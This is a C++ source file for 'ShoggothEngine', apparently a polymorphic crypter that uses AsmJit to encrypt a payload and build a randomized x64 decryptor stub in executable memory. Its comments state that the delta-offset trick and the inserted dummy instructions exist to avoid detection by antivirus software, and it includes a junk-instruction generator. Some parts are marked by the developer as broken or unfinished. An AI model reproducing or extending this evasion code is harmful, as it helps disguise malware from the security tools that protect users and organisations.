#include "ShoggothEngine.h"
#include "AuxFunctions.h"
///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////
typedef int (*Func)(void);

ShoggothPolyEngine::ShoggothPolyEngine():
    allRegs{ x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 },
    generalPurposeRegs { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 }
    {
    srand(time(NULL));
    // allRegs = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };
    // generalPurposeReg = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };
}



ERRORCASES ShoggothPolyEngine::PolymorphicEncryption(PBYTE lpInputBuffer, \
    DWORD dwInputBuffer, \
    PBYTE &lpOutputBuffer, \
    DWORD &lpdwOutputSize)
{
    ///////////////////////////////////////////////////////////
    //
    // check input parameters
    //
    ///////////////////////////////////////////////////////////
    
    asmjitCodeHolder.init(asmjitRuntime.environment());
    asmjitAssembler = new x86::Assembler(&asmjitCodeHolder);
    // randomly select registers
    RandomizeRegisters(); //DONE

    ///////////////////////////////////////////////////////////
    //
    // generate polymorphic function code
    //
    ///////////////////////////////////////////////////////////

    // generate function prologue
    GeneratePrologue(); //DONE

    // set up relative addressing through the delta offset
    // technique
    GenerateDeltaOffset();

    // encrypt the input data, generate encryption keys
    // the additional parameters set the lower and upper
    // limits on the number of encryption instructions
    // which will be generated (there is no limit to this
    // number, you can specify numbers in the thousands,
    // but be aware that this will make the output code
    // quite large)
    EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 3, 5);

    // generate code to set up keys for decryption
    SetupDecryptionKeys();

    // generate decryption code
    GenerateDecryption();
    // OK
    // set up the values of the output registers
    SPE_OUTPUT_REGS regOutput[] = { { x86::rax, dwInputBuffer } };
    //okey cool
    SetupOutputRegisters(regOutput, _countof(regOutput));

    // generate function epilogue OK
    GenerateEpilogue(1L);

    // align the size of the function to a multiple
    // of 4 or 16
    AlignDecryptorBody(RandomizeBinary() == 0 ? 4L : 16L);

    // fix up any instructions that use delta offset addressing
    UpdateDeltaOffsetAddressing();

    // place the encrypted data at the end of the function
    AppendEncryptedData();

    ///////////////////////////////////////////////////////////
    //
    // free resources
    //
    ///////////////////////////////////////////////////////////

    // free the encrypted data buffer
    // free(&diEncryptedData);

    // free the array of encryption pseudoinstructions
    // free(&diCryptOps);

    ///////////////////////////////////////////////////////////
    //
    // copy the polymorphic code to the output buffer
    //
    ///////////////////////////////////////////////////////////

    // DWORD dwOutputSize = a.getCodeSize();
    //Equivalent ? TODO
    DWORD dwOutputSize = asmjitCodeHolder.codeSize();
    // assemble the code of the polymorphic function
    // (this resolves jumps and labels)
    DecryptionProc lpPolymorphicCode;
    Error err = asmjitRuntime.add(&lpPolymorphicCode, &asmjitCodeHolder);

    // this struct describes the allocated memory block
    void *diOutput;

    // allocate memory (with execute permissions) for the
    // output buffer
    diOutput = VirtualAlloc(NULL,dwOutputSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    // check that allocation was successful
    if (diOutput != NULL)
    {
        // copy the generated code of the decryption function
        memcpy(diOutput, lpPolymorphicCode, dwOutputSize);

        // provide the output buffer and code size to
        // this function's caller --> it's already executable ama babba
        lpOutputBuffer = (PBYTE) diOutput;
        lpdwOutputSize = dwOutputSize;

    }
    else
    {
        free(lpPolymorphicCode);

        return ERR_MEMORY;
    }

    ///////////////////////////////////////////////////////////
    //
    // function exit
    //
    ///////////////////////////////////////////////////////////

    return ERR_SUCCESS;
}

///////////////////////////////////////////////////////////
//
// random register selection
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::RandomizeRegisters(){
    // set random registers
    x86::Gp cRegsGeneral[] = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi,x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };

    // shuffle the order of registers in the array
    MixupArrayRegs(cRegsGeneral, _countof(cRegsGeneral));

    // the register which will contain
    // a pointer to the encrypted data
    regSrc = cRegsGeneral[0];

    // the register which will contain
    // a pointer to the output buffer
    // (supplied as a function parameter)
    regDst = cRegsGeneral[1];

    // the register which will contain
    // the size of the encrypted data buffer
    regSize = cRegsGeneral[2];

    // the register which will contain
    // the decryption key
    regKey = cRegsGeneral[3];

    // the register which will contain
    // the current data value and on which
    // the decryption instructions will operate
    regData = cRegsGeneral[4];

    // set the register whose values will be
    // preserved across function invocations
    // Should we check them? Whether we use or not
    x86::Gp cRegsSafe[] = { x86::rsi, x86::rdi, x86::rbx,x86::r12,x86::r13,x86::r14,x86::r15};

    // shuffle the order of the registers in the array
    MixupArrayRegs(cRegsSafe, _countof(cRegsSafe));

    regSafe1 = cRegsSafe[0];
    regSafe2 = cRegsSafe[1];
    regSafe3 = cRegsSafe[2];
    regSafe4 = cRegsSafe[3];
    regSafe5 = cRegsSafe[4];
    regSafe6 = cRegsSafe[5];
    regSafe7 = cRegsSafe[6];
}


///////////////////////////////////////////////////////////
//
// generate the prologue of the decryption function
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GeneratePrologue()
{
    /* Beklenilen
    push ebp
    mov ebp,esp
    push esi
    push edi
    push ebx

    veya 

    enter 0,0
    push esi
    push edi
    push ebx
    mov dst, dword ptr --> return address ve push ebpnin bir ustu arguman sirasi yani

    
    shadow register koymak lazim abiye göre. Fonksiyon tek parametreli
    mov         qword ptr [rsp+8],rcx
    */
   

    // function prologue
    // first the original value of EBP is saved
    // so we can use EBP to refer to the stack frame
    if (RandomizeBinary() == 0)
    {
        asmjitAssembler->push(x86::rbp);
        asmjitAssembler->mov(x86::rbp, x86::rsp);
    }
    else
    {
        // equivalent to the instructions
        // push ebp
        // mov ebp,esp
        asmjitAssembler->enter(imm(0), imm(0));
        // Make Stack Frame 
        // enter equals to leave inverse, first 0 means local variable size
        // Modifies stack for entry to procedure for high level language. 
        // Operand locals specifies the amount of storage to be allocated
        // on the stack.Level specifies the nesting level of the routine.
        // Paired with the LEAVE instruction, this is an efficient method of
        // entryand exit to procedures.
        // https://mudongliang.github.io/x86/html/file_module_x86_id_78.html --> mov ebp esp, pop ebp --> bu bir nested demek
    }

    // if our function is called using the stdcall
    // convention, and modifies ESI, EDI, or EBX,
    // they must be saved at the beginning of
    // the function and restored at the end
    asmjitAssembler->push(regSafe1);
    asmjitAssembler->push(regSafe2);
    asmjitAssembler->push(regSafe3);
    asmjitAssembler->push(regSafe4);
    asmjitAssembler->push(regSafe5);
    asmjitAssembler->push(regSafe6);
    asmjitAssembler->push(regSafe7);

    // load the pointer to the output buffer
    // into our randomly-selected register regDst
    // (this is the only parameter to the function,
    // passed on the stack)
    asmjitAssembler->mov(regDst, x86::rcx);
    // a->mov(regDst, x86::dword_ptr(x86::rsp, 0x08));
}

///////////////////////////////////////////////////////////
//
// generate delta offset
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GenerateDeltaOffset()
{
    
    /* Beklenilen
    call deltaOffset
    mov eax,1 veya xor eax,eax
    leave unused
    ret 4 unused
    delta_offset:
    mov regSrc, [esp]
    add esp,4
    Buraya bir sayi gelecek --> add regSrc ,(encrypted_data-delta_offset + size of the unused instructions) --> runtimeda deger almak --> encrypted_data = delta_offset ve sonrasi yani sonuc sonrasi arti oncesi oluyor
    Correct, True

    
    */


    // Calldan sonra biraz unused instructionlar gelecek diyor --> Bunun amaci antivirusu sasirtmak
    // generate code which will allow us to
    // obtain a pointer to the encrypted data
    // at the end of the decryption function

    // decryption_function:
    // ...
    // call delta_offset
    // mov eax,1 | xor eax,eax ; \
    // leave                   ;  > unused instructions
    // ret 4                   ; /
    // delta_offset:
    // pop regSrc --> mov eax,1'in adresi stacke geliyor
    // add regSrc, (encrypted_data-delta_offset +
    // ...          + size of the unused instructions)
    // ret 4
    // db 0CCh, 0CCh...
    // encrypted_data:
    // db 0ABh, 0BBh, 083h...

    // create the delta_offset label
    lblDeltaOffset = asmjitAssembler->newLabel();

    // generate 'call delta_offset'
    asmjitAssembler->call(lblDeltaOffset);

    size_t posUnusedCodeStart = asmjitAssembler->offset();

    // in order to avoid getting flagged by
    // antivirus software, we avoid the typical
    // delta offset construction, i.e. call + pop,
    // by inserting some unused instructions in
    // between, in our case a sequence that looks
    // like the normal code which returns from
    // a function
    if (RandomizeBinary() == 0)
    {
        asmjitAssembler->mov(x86::rax, imm(1));
    }
    else
    {
        asmjitAssembler->xor_(x86::rax, x86::rax);
    }

    asmjitAssembler->leave();
    asmjitAssembler->ret(2 * sizeof(DWORD));

    // calculate the size of the unused code,
    // i.e. the difference between the current
    // position and the beginning of the
    // unused code
    dwUnusedCodeSize = static_cast<DWORD>(asmjitAssembler->offset() - posUnusedCodeStart);

    // put the label "delta_offset:" here ****
    asmjitAssembler->bind(lblDeltaOffset);

    posDeltaOffset = asmjitAssembler->offset(); //regsrc point

    // instead of the pop instruction, we will
    // use a different method of reading the
    // stack, to avoid rousing the suspicions of
    // antivirus programs

    //a.pop(regSrc);
    asmjitAssembler->mov(regSrc, x86::dword_ptr(x86::rsp));
    asmjitAssembler->add(x86::rsp, imm(2*sizeof(DWORD)));

    // Add dedigi sey burada code size'i olacak, cunku addressi aliyoruz call diyerek
    // the address of the label "delta_offset:"
    // will now be in the regSrc register;
    // we need to adjust this by the size of
    // the remainder of the function (which we
    // don't know and will have to update later)
    // for now we use the value 987654321 to
    // ensure AsmJit generates the long form of
    // the "add" instruction
    asmjitAssembler->add(regSrc, imm(272727));

    // save the position of the previous DWORD
    // so that we can later update it to contain
    // the length of the remainder of the function
    // Bi oncesi 
    posSrcPtr = asmjitAssembler->offset() - sizeof(DWORD);
}


///////////////////////////////////////////////////////////
//
// generate the encryption keys, encryption instructions,
// and finally encrypt the input data
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::EncryptInputBuffer(PBYTE inputBuffer, \
    DWORD inputBufferSize, \
    DWORD dwMinInstr, \
    DWORD dwMaxInstr)
{
    // lpInputBuffer --> input addr
    // dwInputBuffer --> Inputun size'i
    // generate an encryption key   
    dwEncryptionKey = RandomizeDWORD();

    // round up the size of the input buffer --> 16
    DWORD dwAlignedSize = (DWORD)ceil((float)inputBufferSize / sizeof(DWORD)) * sizeof(DWORD);

    // number of blocks to encrypt
    // divide the size of the input data
    // into blocks of 4 bytes (DWORDs)
    dwEncryptedBlocks = dwAlignedSize / sizeof(DWORD);

    // DWORD arrayine donusturdu dorderli encryption icin
    PDWORD inputBufferDwordBlockArray = reinterpret_cast<PDWORD>(inputBuffer);

    // allocate memory for the output data
    // (the size will be rounded to the
    // block size)
    diEncryptedData = malloc(dwAlignedSize);
    // Bu da enecrypted versionu tutacak variable
    PDWORD encryptedDataBuffer = reinterpret_cast<PDWORD>(diEncryptedData);

    // randomly select the number of encryption instructions --> how many encryption operations will be applied to data blocks
    dwCryptOpsCount = dwMinInstr + rand() % ((dwMaxInstr + 1) - dwMinInstr);

    // allocate memory for an array which will
    // record information about the sequence of
    // encryption instructions
    diCryptOps = malloc(dwCryptOpsCount * sizeof(SPE_CRYPT_OP));

    // set up a direct pointer to this table
    // in a helper variable
    lpcoCryptOps = reinterpret_cast<P_SPE_CRYPT_OP>(diCryptOps);

    // generate encryption instructions and their type
    for (DWORD i = 0; i < dwCryptOpsCount; i++)
    {
        // will the instruction perform an operation
        // combining regData and regKey?
        lpcoCryptOps[i].bCryptWithReg = RandomizeBool();

        // the register we are operating on
        lpcoCryptOps[i].regDst = regData;

        // if the instruction doesn't use the regKey
        // register, generate a random key which
        // will be used in the operation
        if (lpcoCryptOps[i].bCryptWithReg == FALSE)
        {
            lpcoCryptOps[i].dwCryptValue = RandomizeDWORD();
        }
        else
        {
            lpcoCryptOps[i].regSrc = regKey;
        }

        // randomly choose the type of encryption instruction
        lpcoCryptOps[i].cCryptOp = static_cast<BYTE>(rand() % 5);
    }

    // encrypt the input data according to the
    // instructions we have just generated
    for (DWORD i = 0, dwInitialEncryptionKey = dwEncryptionKey; \
        i < dwEncryptedBlocks; i++)
    {
        // take the next block for encryption
        DWORD dwInputBlock = inputBufferDwordBlockArray[i];

        // encryption loop: executes the sequence of
        // encryption instructions on the data block
        for (DWORD j = 0, dwCurrentEncryptionKey; j < dwCryptOpsCount; j++)
        {
            if (lpcoCryptOps[j].bCryptWithReg == FALSE)
            {
                dwCurrentEncryptionKey = lpcoCryptOps[j].dwCryptValue;
            }
            else
            {
                dwCurrentEncryptionKey = dwInitialEncryptionKey;
            }

            // depending on the encryption operation,
            // perform the appropriate modification
            // of the data block
            switch (lpcoCryptOps[j].cCryptOp)
            {
            case SPE_CRYPT_OP_ADD:
                dwInputBlock += dwCurrentEncryptionKey;
                break;
            case SPE_CRYPT_OP_SUB:
                dwInputBlock -= dwCurrentEncryptionKey;
                break;
            case SPE_CRYPT_OP_XOR:
                dwInputBlock ^= dwCurrentEncryptionKey;
                break;
            case SPE_CRYPT_OP_NOT:
                dwInputBlock = ~dwInputBlock;
                break;
            case SPE_CRYPT_OP_NEG:
                dwInputBlock = 0L - dwInputBlock;
                break;
            }
        }

        // store the encrypted block in the buffer
        encryptedDataBuffer[i] = dwInputBlock;
    }
}

///////////////////////////////////////////////////////////
//
// set up the keys which will be used to decrypt the data
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::SetupDecryptionKeys()
{   // --> Encryption keyinin duzenlenmesi, delta offsetten hemen sonra
    // set up a decryption key in the regKey
    // register, which will itself be encrypted

    /*
    *   after source offset, 2 instruction
        Works correctly
    */
    DWORD dwKeyModifier = RandomizeDWORD();

    // randomly generate instructions to set up
    // the decryption key
    switch (rand()%3)
    {
        // mov regKey,dwKey - dwMod
        // add regKey,dwMod
    case 0:
        asmjitAssembler->mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
        asmjitAssembler->add(regKey, imm(dwKeyModifier));
        break;

        // mov regKey,dwKey + dwMod
        // sub regKey,dwMod
    case 1:
        asmjitAssembler->mov(regKey, imm(dwEncryptionKey + dwKeyModifier));
        asmjitAssembler->sub(regKey, imm(dwKeyModifier));
        break;

        // mov regKey,dwKey ^ dwMod
        // xor regKey,dwMod
    case 2:
        asmjitAssembler->mov(regKey, imm(dwEncryptionKey ^ dwKeyModifier));
        asmjitAssembler->xor_(regKey, imm(dwKeyModifier));
        break;
    }
}

///////////////////////////////////////////////////////////
//
// generate the decryption code (for the main decryption loop)
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GenerateDecryption()
{
    // set up the size of the encrypted data
    // (in blocks)
    //True mov    ebx,0x4
    asmjitAssembler->mov(regSize, imm(dwEncryptedBlocks));

    // create a label for the start of the
    // decryption loop
    Label lblDecryptionLoop = asmjitAssembler->newLabel();
    // True
    asmjitAssembler->bind(lblDecryptionLoop);

    // read the data referred to by the
    // regSrc register
    // mov    esi,DWORD PTR [edx]
    asmjitAssembler->mov(regData, dword_ptr(regSrc));

    // build the decryption code by generating each
    // decryption instruction in turn (reversing the
    // order and the operations that were used for
    // encryption!)
    for (DWORD i = dwCryptOpsCount - 1; i != -1L; i--)
    {
        // encryption was done either with the key
        // in register regKey, or a constant value,
        // so depending on this we need to generate
        // the appropriate decryption instructions
        if (lpcoCryptOps[i].bCryptWithReg == FALSE)
        {
            DWORD dwDecryptionKey = lpcoCryptOps[i].dwCryptValue;

            switch (lpcoCryptOps[i].cCryptOp)
            {
            case SPE_CRYPT_OP_ADD:
                // sub    esi,0x3c4f6a5
                asmjitAssembler->sub(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
                break;
            case SPE_CRYPT_OP_SUB:
                asmjitAssembler->add(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
                break;
            case SPE_CRYPT_OP_XOR:
                asmjitAssembler->xor_(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
                break;
            case SPE_CRYPT_OP_NOT:
                asmjitAssembler->not_(lpcoCryptOps[i].regDst);
                break;
            case SPE_CRYPT_OP_NEG:
                asmjitAssembler->neg(lpcoCryptOps[i].regDst);
                break;
            }
        }
        else
        {
            switch (lpcoCryptOps[i].cCryptOp)
            {
            case SPE_CRYPT_OP_ADD:
                asmjitAssembler->sub(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
                break;
            case SPE_CRYPT_OP_SUB:
                asmjitAssembler->add(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
                break;
            case SPE_CRYPT_OP_XOR:
                asmjitAssembler->xor_(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
                break;
            case SPE_CRYPT_OP_NOT:
                asmjitAssembler->not_(lpcoCryptOps[i].regDst);
                break;
            case SPE_CRYPT_OP_NEG:
                asmjitAssembler->neg(lpcoCryptOps[i].regDst);
                break;
            }
        }
    }

    // write the decrypted block to the output
    // buffer
    //  mov    DWORD PTR [ecx],esi
    asmjitAssembler->mov(dword_ptr(regDst), regData);

    // update the pointers to the input and ouput
    // buffers to point to the next block
    // add    edx,0x4
    // add    ecx,0x4
    asmjitAssembler->add(regSrc, imm(sizeof(DWORD)));
    asmjitAssembler->add(regDst, imm(sizeof(DWORD)));

    // decrement the loop counter (the number of
    // blocks remaining to decrypt)
    // dec    ebx
    asmjitAssembler->dec(regSize);

    // check if the loop is finished
    // if not, jump to the start
    // jne    0x32
    asmjitAssembler->jne(lblDecryptionLoop);
}


///////////////////////////////////////////////////////////
//
// set up output registers, including the function return value
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::SetupOutputRegisters(SPE_OUTPUT_REGS* regOutput, DWORD dwCount)
{
    /*
    Our decryption function will return a value of type DWORD
    (a 32-bit value corresponding to unsigned int), which indicates
    the size of the decrypted data. This value will be returned in the EAX register.
    */

    /*                              regDst       dwValue yani size
     SPE_OUTPUT_REGS regOutput[] = { { x86::eax, dwInputBuffer } };

     SetupOutputRegisters(regOutput, _countof(regOutput));

    Listing 10.Setting up the return value of the decryption function
    (the size of the decrypted data) as well as any other final values we wish to place in registers.
    Our polymorphic engine allows any set of output registers to be defined (that is, we are not limited
    to setting the value returned in EAX). This makes it possible for the function to output extra values.
    
    */
    // if there are no output registers to
    // set up, return
    if ((regOutput == NULL) || (dwCount == 0))
    {
        return;
    }

    // shuffle the order in which the registers
    // will be set up
    MixupArrayOutputRegs(regOutput, dwCount);

    // generate instructions to set up the
    // output registers
    // mov r32, imm32
    for (DWORD i = 0; i < dwCount; i++)
    {
        //mov    eax,0xd --> true size
        asmjitAssembler->mov(regOutput[i].regDst, imm(regOutput[i].dwValue));
    }
}


///////////////////////////////////////////////////////////
//
// generate epilogue of the decryption function
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GenerateEpilogue(DWORD dwParamCount)
{
    /*
    50: 5f                      pop    edi
    51: 5e                      pop    esi
    52: 5b                      pop    ebx
    53: 89 ec                   mov    esp,ebp
    55: 5d                      pop    ebp
    56: c2 04 00                ret    0x4
    
    */

    // restore the original values of
    // registers ESI EDI EBX
    asmjitAssembler->pop(regSafe7);
    asmjitAssembler->pop(regSafe6);
    asmjitAssembler->pop(regSafe5);
    asmjitAssembler->pop(regSafe4);
    asmjitAssembler->pop(regSafe3);
    asmjitAssembler->pop(regSafe2);
    asmjitAssembler->pop(regSafe1);


    // restore the value of EBP
    if (RandomizeBinary() == 0)
    {
        asmjitAssembler->leave();
    }
    else
    {
        // equivalent to "leave"
        asmjitAssembler->mov(x86::rsp, x86::rbp);
        asmjitAssembler->pop(x86::rbp);
    }

    // return to the code which called
    // our function; additionally adjust
    // the stack by the size of the passed
    // parameters (by stdcall convention)
    asmjitAssembler->ret(imm(dwParamCount * sizeof(DWORD)));
}


///////////////////////////////////////////////////////////
//
// align the size of the decryption function
// to the specified granularity
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::AlignDecryptorBody(DWORD dwAlignment)
{
    // take the current size of the code
    DWORD dwCurrentSize = asmjitCodeHolder.codeSize();

    // find the number of bytes that would
    // align the size to a multiple of the
    // supplied size (e.g. 4)
    DWORD dwAlignmentSize = AlignBytes(dwCurrentSize, dwAlignment) - dwCurrentSize;

    // check if any alignment is required
    if (dwAlignmentSize == 0)
    {
        return;
    }

    // add padding instructions (int3 or nop)
    if (RandomizeBinary() == 0)
    {
        while (dwAlignmentSize--) asmjitAssembler->int3();
    }
    else
    {
        while (dwAlignmentSize--) asmjitAssembler->nop();
    }
}


///////////////////////////////////////////////////////////
//
// correct all instructions making use of
// addressing relative to the delta offset
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::UpdateDeltaOffsetAddressing()
{   
    size_t current_position = asmjitAssembler->offset();

    DWORD dwAdjustSize = static_cast<DWORD>(asmjitAssembler->offset() - posDeltaOffset);

    asmjitAssembler->setOffset(posSrcPtr);
    // correct the instruction which sets up
    // a pointer to the encrypted data block
    // at the end of the decryption function
    //
    // this pointer is loaded into the regSrc
    // register, and must be updated by the
    // size of the remainder of the function
    // after the delta_offset label --> Labelden oncesi + labeldan sonrasi
    asmjitAssembler->dd(dwAdjustSize + dwUnusedCodeSize);
    asmjitAssembler->setOffset(current_position);
}


///////////////////////////////////////////////////////////
//
// append the encrypted data to the end of the code
// of the decryption function
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::AppendEncryptedData(){
    PDWORD lpdwEncryptedData = reinterpret_cast<PDWORD>(diEncryptedData);

    // place the encrypted data buffer
    // at the end of the decryption function
    // (in 4-byte blocks)
    for (DWORD i = 0; i < dwEncryptedBlocks; i++)
    {
        asmjitAssembler->dd(lpdwEncryptedData[i]);
    }
}

void ShoggothPolyEngine::MixupArrayOutputRegs(SPE_OUTPUT_REGS* registerArr, WORD size) {
    SPE_OUTPUT_REGS temp;
    for (int i = size - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        // Swap arr[i] with the element
        temp = registerArr[i];
        registerArr[i] = registerArr[j];
        registerArr[j] = temp;
    }
}


void ShoggothPolyEngine::MixupArrayRegs(x86::Reg* registerArr, WORD size) {
    x86::Reg temp;
    for (int i = size - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        // Swap arr[i] with the element
        temp = registerArr[i];
        registerArr[i] = registerArr[j];
        registerArr[j] = temp;
    }
}

x86::Gp ShoggothPolyEngine::GetRandomRegister() {
    this->MixupArrayRegs(this->allRegs, 16);
    return this->allRegs[RandomizeInRange(0, 15)];
}

void ShoggothPolyEngine::GenerateGarbageInstruction() {
    x86::Gp randomRegister = this->GetRandomRegister();
    BYTE randomValue = (BYTE)(RandomizeInRange(0, 255));
    Func functionPtr;
    asmjitCodeHolder.init(asmjitRuntime.environment());
    asmjitAssembler = new x86::Assembler(&asmjitCodeHolder);

    int startOffset = asmjitAssembler->offset();
    int endOffset = 0;
    // Nop instruction +
    asmjitAssembler->nop(); 
    
    // Cld instruction - Clear Direction flag in EFLAGS +
    asmjitAssembler->cld();
    
    // CLC instruction - Clear carry flag +
    asmjitAssembler->clc();
    
    // CMC instruction - Complement carry flag +
    asmjitAssembler->cmc();
    
    // fwait instruction - Causes the processor to check for and handle pending, unmasked, floating-point exceptions before proceedin
    // asmjitAssembler->fwait();
    // Sikinti
   
    // fnop instruction - Performs no FPU operation. +
    asmjitAssembler->fnop();
    
    // fxam instruction - The fxam instruction examines the value in st(0) and reports the results in the condition code bits +
    asmjitAssembler->fxam();
    
    // ftst instruction - The FTST instruction compares the value on the top of stack with zero. +
    asmjitAssembler->ftst();
    
    // jmp 2 - pass the next inst - Sikinti
    asmjitAssembler->jmp(2);
    
    // xor register,0 - nothing changes +
    asmjitAssembler->xor_(randomRegister, 0);
    
    // bt register, register - The CF flag contains the value of the selected bit. +
    asmjitAssembler->bt(randomRegister, randomRegister);
    
    // cmp - compare instruction + 
    asmjitAssembler->cmp(randomRegister, randomRegister);
    
    // mov instruction +
    asmjitAssembler->mov(randomRegister, randomRegister);
    
    // xchg - The XCHG (exchange data) instruction exchanges the contents of two operands.
    // Sikinti
    //asmjitAssembler->xchg(randomRegister, randomRegister);
    
    // test - bitwise and +
    asmjitAssembler->test(randomRegister, randomRegister);
    
    // cmova - The cmova conditional move if above check the state of CF AND ZF. +
    asmjitAssembler->cmova(randomRegister, randomRegister);
    
    // cmovb - The cmovb conditional move if below check the state of CF. +
    asmjitAssembler->cmovb(randomRegister, randomRegister);
    
    // cmovc - The cmovc conditional move if carry check the state of CF
    // asmjitAssembler->cmovc(randomRegister, randomRegister);
    // Sikinti
    // 
    // cmove - similar +
    asmjitAssembler->cmove(randomRegister, randomRegister);
    
    // cmovg +
    asmjitAssembler->cmovg(randomRegister, randomRegister);
    
    // cmovl +
    asmjitAssembler->cmovl(randomRegister, randomRegister);
    
    // cmovo +
    asmjitAssembler->cmovo(randomRegister, randomRegister);
    
    // cmovp +
    asmjitAssembler->cmovp(randomRegister, randomRegister);
    
    // cmovs +
    asmjitAssembler->cmovs(randomRegister, randomRegister);
    
    // cmovz
    // asmjitAssembler->cmovz(randomRegister, randomRegister);
    // Sikinti
   
    // cmovae +
    asmjitAssembler->cmovae(randomRegister, randomRegister);
    
    // cmovge +
    asmjitAssembler->cmovge(randomRegister, randomRegister);
    
    // cmovle +
    asmjitAssembler->cmovle(randomRegister, randomRegister);
    
    // cmovna
    // asmjitAssembler->cmovna(randomRegister, randomRegister);
    // Sikinti
     
    // cmovnb Sikinti
    //asmjitAssembler->cmovnb(randomRegister, randomRegister);
    
    // cmovnc Sikinti
    //asmjitAssembler->cmovnc(randomRegister, randomRegister);
    
    // cmovne
    asmjitAssembler->cmovne(randomRegister, randomRegister);
    
    // cmovng
    asmjitAssembler->cmovng(randomRegister, randomRegister);
    
    // cmovnl
    asmjitAssembler->cmovnl(randomRegister, randomRegister);
    
    // cmovno
    asmjitAssembler->cmovno(randomRegister, randomRegister);
    
    // cmovnp +
    asmjitAssembler->cmovnp(randomRegister, randomRegister);
    
    // cmovns + 
    asmjitAssembler->cmovns(randomRegister, randomRegister);
    
    // cmovnz Sikinti
    // asmjitAssembler->cmovnz(randomRegister, randomRegister);
    
    // cmovpe Sikinti
    //asmjitAssembler->cmovpe(randomRegister, randomRegister);
    
    // cmovpo Sikinti
    //asmjitAssembler->cmovpo(randomRegister, randomRegister);
    
    // cmovbe +
    asmjitAssembler->cmovbe(randomRegister, randomRegister);
    
    // cmovnae Sikinti
    // asmjitAssembler->cmovnae(randomRegister, randomRegister);
    
    // cmovnbe Sikinti
    // asmjitAssembler->cmovnbe(randomRegister, randomRegister);
    
    // cmovnle Sikinti
    // asmjitAssembler->cmovnle(randomRegister, randomRegister);
    
    // cmovnge Sikinti
    // asmjitAssembler->cmovnge(randomRegister, randomRegister);
    
    // jmp label;garbage;label: +
    Label randomLabel = asmjitAssembler->newNamedLabel(GenerateRandomString(), 16);
    asmjitAssembler->jmp(randomLabel);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->bind(randomLabel);
    
    // not register;garbage;not register +
    asmjitAssembler->not_(randomRegister);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->not_(randomRegister);
    
    // neg register;garbage;neg register +
    asmjitAssembler->neg(randomRegister);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->neg(randomRegister);
    
    // inc register;garbage;dec register + 
    asmjitAssembler->inc(randomRegister);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->dec(randomRegister);
    
    // dec register;garbage;inc register +
    asmjitAssembler->dec(randomRegister);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->inc(randomRegister);
    
    // push register;garbage;pop register +
    asmjitAssembler->push(randomRegister);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->pop(randomRegister);
    
    // bswap register;garbage;bswap register +
    asmjitAssembler->bswap(randomRegister);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->bswap(randomRegister);
    
    // add register,value ;garbage;sub register,value +
    asmjitAssembler->add(randomRegister,randomValue);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->sub(randomRegister, randomValue);
    
    // sub register,value ;garbage;add register,value +
    asmjitAssembler->sub(randomRegister,randomValue);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->add(randomRegister,randomValue);
     
    // ror register,value ;garbage;rol register,value +
    asmjitAssembler->ror(randomRegister,randomValue);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->rol(randomRegister,randomValue);

    // rol register,value ;garbage;ror register,value +
    asmjitAssembler->rol(randomRegister,randomValue);
    // this->GenerateGarbageInstruction();
    asmjitAssembler->ror(randomRegister,randomValue);

    DWORD dwOutputSize = asmjitCodeHolder.codeSize(); // Might be incorrect
    printf("%d\n",dwOutputSize);
    // Correct way of getting size
    endOffset = asmjitAssembler->offset();
    printf("%d\n", endOffset - startOffset);
    // assemble the code of the polymorphic function
    // (this resolves jumps and labels)
    Error err = asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);

    FILE* hFile = fopen("garbagetest.bin", "wb");

    if (hFile != NULL)
    {
        fwrite(functionPtr, endOffset - startOffset, 1, hFile);
        fclose(hFile);
    }

}